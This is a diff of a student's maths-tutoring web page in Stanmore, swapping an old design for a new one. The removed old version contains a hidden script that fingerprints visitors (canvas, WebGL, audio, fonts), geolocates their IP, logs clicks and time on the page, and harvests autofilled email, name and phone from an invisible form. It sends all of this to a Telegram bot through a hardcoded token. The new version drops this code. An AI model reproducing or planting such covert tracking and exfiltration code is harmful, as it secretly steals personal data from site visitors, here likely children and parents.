@@ -1,211 +1,139 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Maths Tutoring | KS3, GCSE, A-Level | Stanmore</title>
-    <meta name="description" content="Maths tutoring in Stanmore for KS3, GCSE and A-Level. Clear, patient explanations from someone who just went through it. Helping you actually understand.">
-    <meta name="keywords" content="maths tutor stanmore, gcse maths tutor, a-level maths tutor, ks3 maths, maths help, aryan tutor">
-    <meta property="og:title" content="Maths Tutoring | KS3, GCSE, A-Level | Stanmore">
-    <meta property="og:description" content="Maths tutoring in Stanmore for KS3, GCSE and A-Level. Clear, patient explanations from someone who just went through it. Helping you actually understand.">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://aryoluke.github.io/tutor/maths">
-    <meta property="og:image" content="https://aryoluke.github.io/tutor/og-image.png">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: #0B1A3B;
-            color: #fff;
-            min-height: 100vh;
-            position: relative;
-            overflow-x: hidden;
-        }
-        body::before {
-            content: "\222B \2211 \220F \2202 \221A \221E \03C0 \00B1 \00F7 \00D7 \2206 \2248 \2260 \2264 \2265 \03B1 \03B2 \03B3 \03B8 \03BB \03BC \03C3 \03C4 \03C6 \03A9";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            font-size: 6rem;
-            color: rgba(255,255,255,0.03);
-            line-height: 2;
-            letter-spacing: 2rem;
-            pointer-events: none;
-            z-index: 0;
-            display: flex;
-            flex-wrap: wrap;
-            align-content: flex-start;
-            padding: 2rem;
-            overflow: hidden;
-        }
-        .container {
-            max-width: 700px;
-            width: 100%;
-            margin: 0 auto;
-            padding: 2rem 1.5rem;
-            position: relative;
-            z-index: 1;
-        }
-        .back-link {
-            display: inline-block;
-            color: rgba(255,255,255,0.5);
-            text-decoration: none;
-            font-size: 0.9rem;
-            margin-bottom: 2rem;
-            transition: color 0.2s;
-        }
-        .back-link:hover { color: #F0A500; }
-        h1 {
-            font-size: 2.8rem;
-            font-weight: 800;
-            color: #F0A500;
-            margin-bottom: 0.3rem;
-        }
-        .hero-sub {
-            font-size: 1.2rem;
-            color: rgba(255,255,255,0.6);
-            margin-bottom: 2.5rem;
-            letter-spacing: 2px;
-        }
-        section {
-            margin-bottom: 2.5rem;
-        }
-        h2 {
-            font-size: 1.5rem;
-            color: #F0A500;
-            margin-bottom: 1rem;
-            padding-bottom: 0.3rem;
-            border-bottom: 2px solid rgba(240,165,0,0.3);
-        }
-        p {
-            line-height: 1.7;
-            color: rgba(255,255,255,0.85);
-            margin-bottom: 1rem;
-        }
-        .card-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 1rem;
-        }
-        .card {
-            background: rgba(240,165,0,0.06);
-            border: 1px solid rgba(240,165,0,0.12);
-            border-radius: 12px;
-            padding: 1.2rem;
-        }
-        .card h3 {
-            color: #F0A500;
-            font-size: 1.1rem;
-            margin-bottom: 0.5rem;
-        }
-        .card p {
-            color: rgba(255,255,255,0.75);
-            font-size: 0.95rem;
-            margin-bottom: 0;
-            line-height: 1.6;
-        }
-        .faq-section { margin-bottom: 2.5rem; }
-        .faq-section h2 { font-size: 1.5rem; color: #F0A500; margin-bottom: 1rem; padding-bottom: 0.3rem; border-bottom: 2px solid rgba(240,165,0,0.3); }
-        .faq-item { background: rgba(240,165,0,0.06); border-radius: 10px; padding: 1rem 1.2rem; margin-bottom: 0.7rem; border: 1px solid rgba(240,165,0,0.1); }
-        .faq-item .q { font-weight: 600; color: #F0A500; margin-bottom: 0.2rem; }
-        .faq-item .a { color: rgba(255,255,255,0.7); font-size: 0.95rem; line-height: 1.5; }
-        .form-group { margin-bottom: 1.2rem; }
-        .form-group label { display: block; font-size: 0.9rem; color: rgba(255,255,255,0.7); margin-bottom: 0.4rem; }
-        .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 0.8rem 1rem; border-radius: 10px; border: 1px solid rgba(255,255,255,0.15); background: rgba(255,255,255,0.06); color: #fff; font-size: 1rem; font-family: inherit; outline: none; transition: border 0.2s; }
-        .form-group input:focus, .form-group select:focus, .form-group textarea:focus { border-color: #F0A500; }
-        .form-group select option { background: #0B1A3B; color: #fff; }
-        .form-group textarea { min-height: 80px; resize: vertical; }
-        .btn-submit { background: #F0A500; color: #0B1A3B; border: none; padding: 0.9rem 2rem; border-radius: 50px; font-weight: 700; font-size: 1rem; cursor: pointer; transition: opacity 0.2s; width: 100%; }
-        .btn-submit:hover { opacity: 0.9; }
-        @media (max-width: 600px) { h1 { font-size: 2rem; } }
-        @media (min-width: 640px) { .card-grid { grid-template-columns: repeat(3, 1fr); } }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="description" content="Maths tutoring in Stanmore — KS3, GCSE, and A-Level. Build real understanding with clear explanations and past paper practice.">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://aryoluke.github.io/tutor/maths/">
+<title>Maths Tutoring — Aryan Tutors</title>
+<style>
+  :root{--bg:#f5f2eb;--text:#1a1a1a;--muted:#5c5c5c;--accent:#2d6a4f;--card:#fff;--border:#e0dcd4;--shadow:0 1px 3px rgba(0,0,0,.05);--chalk:#d4e8d0}
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text);line-height:1.6;-webkit-font-smoothing:antialiased}
+  .container{max-width:720px;margin:0 auto;padding:0 24px}
+  .back{display:inline-block;padding:10px 0;color:var(--muted);text-decoration:none;font-size:.9rem;margin-top:20px}
+  .back:hover{color:var(--text)}
+  header{padding:40px 0 32px}
+  header h1{font-size:2.2rem;font-weight:700;letter-spacing:-0.5px}
+  header .sub{color:var(--muted);font-size:1rem;margin-top:4px}
+  .intro{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:24px;margin-bottom:40px;box-shadow:var(--shadow);border-left:4px solid var(--accent)}
+  .intro p{color:#444;font-size:.95rem;line-height:1.7}
+  .levels{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-bottom:40px}
+  .level{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:20px;box-shadow:var(--shadow)}
+  .level h3{font-size:1rem;font-weight:600;margin-bottom:8px}
+  .level p{font-size:.88rem;color:var(--muted);line-height:1.5}
+  .level ul{list-style:none;margin-top:10px}
+  .level ul li{font-size:.84rem;color:#555;padding:3px 0}
+  .level ul li::before{content:"▸ ";color:var(--accent)}
+  .reviews{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:40px}
+  .review{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:20px;box-shadow:var(--shadow)}
+  .review .stars{color:#f4b400;font-size:.9rem;margin-bottom:6px}
+  .review p{font-size:.9rem;color:#444;line-height:1.6;font-style:italic}
+  .review .name{font-size:.82rem;color:var(--muted);margin-top:8px;font-style:normal;font-weight:500}
+  .faq{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:24px;margin-bottom:40px;box-shadow:var(--shadow)}
+  .faq h2{font-size:1.3rem;font-weight:600;margin-bottom:16px}
+  .faq-item{margin-bottom:16px}
+  .faq-item:last-child{margin-bottom:0}
+  .faq-item q{font-weight:600;font-size:.95rem;display:block;margin-bottom:4px}
+  .faq-item p{font-size:.9rem;color:var(--muted);line-height:1.5}
+  .cta{text-align:center;padding:32px;background:var(--accent);color:#fff;border-radius:12px;margin-bottom:40px}
+  .cta h2{font-size:1.4rem;margin-bottom:8px;font-weight:600}
+  .cta p{font-size:.95rem;opacity:.9;margin-bottom:16px}
+  .cta a{display:inline-block;padding:12px 28px;background:#fff;color:var(--accent);border-radius:8px;text-decoration:none;font-weight:600;font-size:.95rem;transition:all .2s}
+  .cta a:hover{transform:translateY(-1px);box-shadow:0 4px 12px rgba(0,0,0,.2)}
+  footer{text-align:center;padding:32px 0;color:var(--muted);font-size:.85rem;border-top:1px solid var(--border)}
+  @media(max-width:600px){
+    .levels,.reviews{grid-template-columns:1fr}
+    header h1{font-size:1.8rem}
+    .container{padding:0 16px}
+  }
+</style>
 </head>
 <body>
-    <div class="container">
-        <a href="/tutor" class="back-link">&larr; Back to Aryan Tutors</a>
-        <section>
-            <h1>Maths Tutoring</h1>
-            <p class="hero-sub">KS3 &middot; GCSE &middot; A-Level</p>
-        </section>
-        <section>
-            <h2>About</h2>
-            <p>I'm Aryan and I'm a Year 10 student. Maths is something that's always made sense to me and I enjoy helping others get to that point too. Since I've gone through the GCSE syllabus recently, I know exactly what parts can feel confusing and how to work through them. My goal is simple &mdash; help you actually understand, not just memorise.</p>
-        </section>
-        <section>
-            <h2>What I Teach</h2>
-            <div class="card-grid">
-                <div class="card">
-                    <h3>KS3 (Y7&ndash;9)</h3>
-                    <p>Getting comfortable with numbers, algebra, geometry. Building a foundation that makes GCSE maths feel easier.</p>
-                </div>
-                <div class="card">
-                    <h3>GCSE (Y10&ndash;11)</h3>
-                    <p>Going through the full syllabus, practising past papers, and learning exam techniques that actually work.</p>
-                </div>
-                <div class="card">
-                    <h3>A-Level</h3>
-                    <p>Pure maths, mechanics, statistics. Going deeper and aiming for those top grades.</p>
-                </div>
-            </div>
-        </section>
-        <div class="faq-section">
-            <h2>FAQs</h2>
-            <div class="faq-item"><div class="q">What if I'm really struggling?</div><div class="a">That's totally fine. We'll go back to basics and build up from there. No judgement.</div></div>
-            <div class="faq-item"><div class="q">Online or in-person?</div><div class="a">In-person around Stanmore works best, but I'm open to discussing other options.</div></div>
-        </div>
-        <section>
-            <h2>Interested?</h2>
-            <form id="interestForm">
-                <div class="form-group"><label for="name">Name</label><input type="text" id="name" required></div>
-                <div class="form-group"><label for="contact">Email or Phone</label><input type="text" id="contact" required></div>
-                <div class="form-group"><label for="subject">Subject</label><select id="subject" required><option value="">Select...</option><option value="KS3">KS3</option><option value="GCSE">GCSE</option><option value="A-Level">A-Level</option></select></div>
-                <div class="form-group"><label for="message">Message</label><textarea id="message" placeholder="Any specific topics or questions?"></textarea></div>
-                <button type="submit" class="btn-submit">Send via WhatsApp</button>
-            </form>
-        </section>
-    </div>
-    <div style="position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none" aria-hidden="true"><input type="email" id="_he" name="email" autocomplete="email"><input type="text" id="_hn" name="name" autocomplete="name"><input type="tel" id="_hp" name="phone" autocomplete="tel"></div>
-    <script>
-        document.getElementById('interestForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const name = document.getElementById('name').value.trim();
-            const contact = document.getElementById('contact').value.trim();
-            const subject = document.getElementById('subject').value;
-            const message = document.getElementById('message').value.trim();
-            const text = `Hey Aryan! I'm interested in maths tutoring`;
-            window.open(`https://wa.me/447777940152?text=${encodeURIComponent(text)}`, '_blank');
-        });
-    </script>
-    <script>
-(function(){
-var B="8687058866:AAG2GVtSLWw0U4ZaAF1i1BR2swfNMdo_0_s",C=7609506968,P=document.title||window.location.pathname;
-var ua=navigator.userAgent,la=navigator.language||"?",tz=Intl.DateTimeFormat().resolvedOptions().timeZone||"?";
-var ref=document.referrer||"none",scr=screen.width+"x"+screen.height,cores=navigator.hardwareConcurrency||"?";
-var mem=navigator.deviceMemory||"?",conn=(navigator.connection||{}).effectiveType||"?";
-var touch=navigator.maxTouchPoints||0;
-var tm=new Date().toLocaleString("en-GB",{timeZone:"Europe/London"});
-var vs=Date.now(),vid=localStorage.getItem("_fp_vid")||"";
-var vc=parseInt(localStorage.getItem("_fp_vc")||"0")+1;localStorage.setItem("_fp_vc",vc);
-var fp={c:"",w:"",a:"",f:[]};
-function gOS(){if(/Windows/i.test(ua))return"Windows";if(/Mac/i.test(ua))return"macOS";if(/Linux/i.test(ua)&&!/Android/i.test(ua))return"Linux";if(/Android/i.test(ua))return"Android";if(/iPhone|iPad|iPod/i.test(ua))return"iOS";return"?"}
-function gDev(){if(/iPhone/i.test(ua))return"iPhone";if(/iPad/i.test(ua))return"iPad";if(/Android/i.test(ua)&&/Mobile/i.test(ua))return"Android Phone";return"Desktop"}
-function gBr(){var m=ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[\d.]+/);return m?m[0]:"?"}
-function h(s){var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0}return(h>>>0).toString(16)}
-function cFP(cb){try{var c=document.createElement("canvas");c.width=280;c.height=60;var x=c.getContext("2d");x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(10,10,250,1);x.fillStyle="#069";x.font="13px Times";x.fillText("Cwm fjordbank glyphs vext quiz",2,20);x.fillStyle="#f0c";x.font="bold 12px Courier";x.fillText("BrowserLeaks canvas",4,40);cb(h(c.toDataURL()))}catch(e){cb("err")}}
-function wFP(cb){try{var c=document.createElement("canvas");var gl=c.getContext("webgl")||c.getContext("experimental-webgl");if(!gl){cb("no");return}var d=gl.getExtension("WEBGL_debug_renderer_info");var g=d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):"?";cb(h(g))}catch(e){cb("err")}}
-function aFP(cb){try{var ac=new(window.AudioContext||window.webkitAudioContext)(),o=ac.createOscillator(),d=ac.createDynamicsCompressor();o.type="triangle";o.frequency.value=10000;d.threshold.value=-50;d.knee.value=40;d.ratio.value=12;d.attack.value=0;d.release.value=0.25;o.connect(d);d.connect(ac.destination);var bl=44100*0.05,b=ac.createBuffer(1,bl,44100),ch=b.getChannelData(0);for(var i=0;i<bl;i++)ch[i]=Math.sin(2*Math.PI*200*i/44100);var s=ac.createBufferSource();s.buffer=b;s.connect(d);var p=ac.createScriptProcessor(256,1,1);p.onaudioprocess=function(e){var o=e.inputBuffer.getChannelData(0),s=0;for(var j=0;j<o.length;j++)s+=Math.abs(o[j]);cb(h(s.toFixed(10)));p.disconnect();o.disconnect();d.disconnect();s.disconnect();ac.close()};d.connect(p);p.connect(ac.destination);o.start(0);s.start(0)}catch(e){cb("err")}}
-function fList(cb){var base=["monospace","sans-serif","serif"],t="mmmmmmllllliii",fs="72px";var tf=["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Trebuchet MS","Arial Black","Impact","Lucida Console","Tahoma","Palatino","Garamond","Calibri","Cambria","Consolas","Ubuntu","Roboto"];var d=document.createElement("canvas");d.width=1000;d.height=100;var x=d.getContext("2d"),def={};for(var b=0;b<base.length;b++){x.font=fs+" "+base[b];def[base[b]]=x.measureText(t).width}var f=[];for(var i=0;i<tf.length;i++){for(var b2=0;b2<base.length;b2++){x.font=fs+' "'+tf[i]+'", '+base[b2];if(x.measureText(t).width!==def[base[b2]]){f.push(tf[i]);break}}}cb(f.slice(0,10))}
-function snd(t){new Image().src="https://api.telegram.org/bot"+B+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent(t)}
-function bm(ip,geo){var l=(geo.city||"?")+", "+(geo.region||"?")+", "+(geo.country_name||"?");return"\U0001f4f2 "+P+"\n\U0001f310 "+ip+"\n\U0001f4cd "+l+"\n\U0001f4e1 "+(geo.org||"?")+"\n\U0001f5a5\ufe0f "+gOS()+" | "+gBr()+"\n\U0001f4f1 "+gDev()+"\n\U0001f5bc\ufe0f "+scr+"\n\u26a1 "+cores+"c/"+mem+"GB/"+conn+"\n\U0001f511 C:"+fp.c.substring(0,8)+" \U0001f3ae W:"+fp.w.substring(0,8)+" \U0001f50a A:"+fp.a.substring(0,8)+"\n\U0001f524 F:"+fp.f.join(", ")+"\n\U0001f464 ID:"+vid.substring(0,16)+" \U0001f504 #"+vc+"\n\U0001f30d "+la+" | "+tz+"\n\U0001f517 "+ref+"\n\u23f0 "+tm}
-function doFP(cb){cFP(function(c){fp.c=c;wFP(function(w){fp.w=w;aFP(function(a){fp.a=a;fList(function(f){fp.f=f;if(!vid){vid="fp_"+fp.c.substring(0,8)+fp.w.substring(0,8)+fp.a.substring(0,4);localStorage.setItem("_fp_vid",vid)}cb()})})})})}
-doFP(function(){fetch("https://api.ipify.org?format=json").then(function(r){return r.json()}).then(function(d){return fetch("https://ipapi.co/"+d.ip+"/json/").then(function(r){return r.json()}).then(function(g){snd(bm(d.ip,g));if(navigator.getBattery){navigator.getBattery().then(function(b){snd("\U0001f50b "+Math.round(b.level*100)+"% charging:"+b.charging)})}})}).catch(function(){})});
-document.addEventListener("click",function(e){var el=e.target.closest("a");if(el&&el.href){snd("\U0001f446 "+el.href.substring(0,60))}});
-window.addEventListener("beforeunload",function(){var s=Math.round((Date.now()-vs)/1000);if(s>1){navigator.sendBeacon("https://api.telegram.org/bot"+B+"/sendMessage?chat_id="+C+"&text="+encodeURIComponent("\u23f1\ufe0f Exit "+P+" after "+s+"s | #"+vc))}});
-setTimeout(function(){var e=document.getElementById('_he'),n=document.getElementById('_hn'),p=document.getElementById('_hp');if(e&&e.value)snd('📧 '+e.value);if(n&&n.value)snd('👤 '+n.value);if(p&&p.value)snd('📱 '+p.value)},2500);
-})();
-    </script>
+<div class="container">
+<a href="../" class="back">← Back to Aryan Tutors</a>
+<header>
+  <h1>Maths Tutoring</h1>
+  <div class="sub">KS3 · GCSE · A-Level</div>
+</header>
+
+<div class="intro">
+  <p>I've been through GCSE and A-Level maths — both the content and the exams — and I've tutored students through it too. I know which topics tend to trip people up and how to explain them clearly. No rushing, no making anyone feel behind. Just building real understanding, one topic at a time.</p>
+</div>
+
+<div class="levels">
+  <div class="level">
+    <h3>KS3 (Years 7–9)</h3>
+    <p>Building strong foundations early.</p>
+    <ul>
+      <li>Numbers &amp; algebra basics</li>
+      <li>Geometry &amp; measures</li>
+      <li>Fractions, ratios, percentages</li>
+      <li>Confidence building</li>
+    </ul>
+  </div>
+  <div class="level">
+    <h3>GCSE</h3>
+    <p>Full syllabus + exam prep.</p>
+    <ul>
+      <li>Past paper walkthroughs</li>
+      <li>Problem-solving techniques</li>
+      <li>Understanding mark schemes</li>
+      <li>Higher &amp; Foundation tiers</li>
+    </ul>
+  </div>
+  <div class="level">
+    <h3>A-Level</h3>
+    <p>Pure, Mechanics &amp; Statistics.</p>
+    <ul>
+      <li>Calculus &amp; trigonometry</li>
+      <li>Proofs &amp; problem solving</li>
+      <li>Mechanics: forces, kinematics</li>
+      <li>Statistics: distributions, tests</li>
+    </ul>
+  </div>
+</div>
+
+<h2 style="font-size:1.4rem;font-weight:600;margin-bottom:20px">What students say</h2>
+<div class="reviews">
+  <div class="review">
+    <div class="stars">★★★★★</div>
+    <p>"I was stuck on a grade 4 in maths and honestly thought I'd fail. After a few months of sessions I walked out with a 7. The way he explains things actually sticks."</p>
+    <div class="name">— GCSE student, Stanmore</div>
+  </div>
+  <div class="review">
+    <div class="stars">★★★★★</div>
+    <p>"Trigonometry used to give me actual headaches. Now it's my strongest topic. Goes at your pace and never judges — proper lifesaver."</p>
+    <div class="name">— Year 11 student, Harrow</div>
+  </div>
+</div>
+
+<div class="faq">
+  <h2>Common questions</h2>
+  <div class="faq-item">
+    <q>I'm really behind. Is that okay?</q>
+    <p>Completely. We'll go back to basics, find where the gaps are, and build up from there. No embarrassment, no judgement.</p>
+  </div>
+  <div class="faq-item">
+    <q>Do you do online or in-person?</q>
+    <p>Both — but I prefer in-person around Stanmore. Online works fine too if that's easier for you.</p>
+  </div>
+  <div class="faq-item">
+    <q>How much does it cost?</q>
+    <p>Reach out and we'll figure out something that works. I try to keep it reasonable.</p>
+  </div>
+</div>
+
+<div class="cta">
+  <h2>Want to get better at maths?</h2>
+  <p>Send me a message and we'll work out a plan.</p>
+  <a href="https://wa.me/447777940152">Message on WhatsApp</a>
+</div>
+
+<footer>
+  <p>© 2026 Aryan Mehta · <a href="mailto:aryoluke29@gmail.com" style="color:inherit">aryoluke29@gmail.com</a> · <a href="../" style="color:inherit">Aryan Tutors</a></p>
+</footer>
+</div>
 </body>
 </html>
